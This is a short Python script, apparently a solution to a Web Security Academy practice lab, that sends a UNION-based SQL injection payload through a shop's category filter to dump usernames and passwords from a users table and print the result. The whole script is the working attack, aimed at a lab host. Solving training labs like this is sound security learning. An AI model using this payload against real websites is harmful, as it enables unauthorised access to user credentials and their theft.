import requests

site = "ac5d1fe51ea9da83c076087400db0033.web-security-academy.net"

if __name__ == "__main__":
    def try_category(category_string):
        url = f'https://{site}/filter?category={category_string}'
        resp = s.get(url)
        print(resp.text)


    s = requests.Session()
    try_category("""Lifestyle' UNION SELECT username,password from users -- """)
